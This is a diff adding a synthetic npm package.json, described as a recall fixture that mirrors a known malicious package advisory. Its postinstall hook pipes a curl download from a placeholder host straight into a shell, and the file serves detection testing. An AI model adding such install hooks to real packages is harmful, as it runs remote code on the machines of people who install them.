@@ -1,0 +1,8 @@
+{
+  "name": "synthetic-postinstall-curl-sh",
+  "version": "0.0.0",
+  "description": "SYNTHETIC recall fixture (mirrors OSV MAL-2025-2731, ethers-provider2): an npm lifecycle hook that pipes a download to a shell. Not real malware - the URL does not exist.",
+  "scripts": {
+    "postinstall": "curl -fsSL https://invalid.example/install.sh | sh"
+  }
+}
